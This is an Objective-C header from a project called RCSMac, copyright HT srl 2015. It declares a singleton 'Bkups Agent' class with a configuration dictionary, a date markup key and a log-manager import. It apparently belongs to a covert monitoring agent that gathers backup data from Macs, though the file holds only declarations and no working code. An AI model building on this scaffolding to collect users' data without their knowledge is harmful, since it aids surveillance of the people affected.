/*
 * RCSMAgentBkups.h
 * RCSMac
 * Bkups Agent
 *
 *
 * Created by J on 25/02/2015
 * Copyright (C) HT srl 2015. All rights reserved
 *
 */


#ifndef __RCSMAgentBkups_h__
#define __RCSMAgentBkups_h__

#import <Foundation/Foundation.h>
#import "RCSMLogManager.h"


#define MARKUP_KEY @"date"

@interface __m_MAgentBkups : NSObject <__m_Agents>
{
@private
    NSMutableDictionary *mConfiguration;
    NSMutableDictionary *markup;
}

+ (__m_MAgentBkups *)sharedInstance;
- (id)copyWithZone: (NSZone *)aZone;
+ (id)allocWithZone: (NSZone *)aZone;

- (void)release;
- (id)autorelease;
- (id)retain;
- (unsigned)retainCount;

- (NSMutableDictionary *)mConfiguration;
- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;

@end

#endif
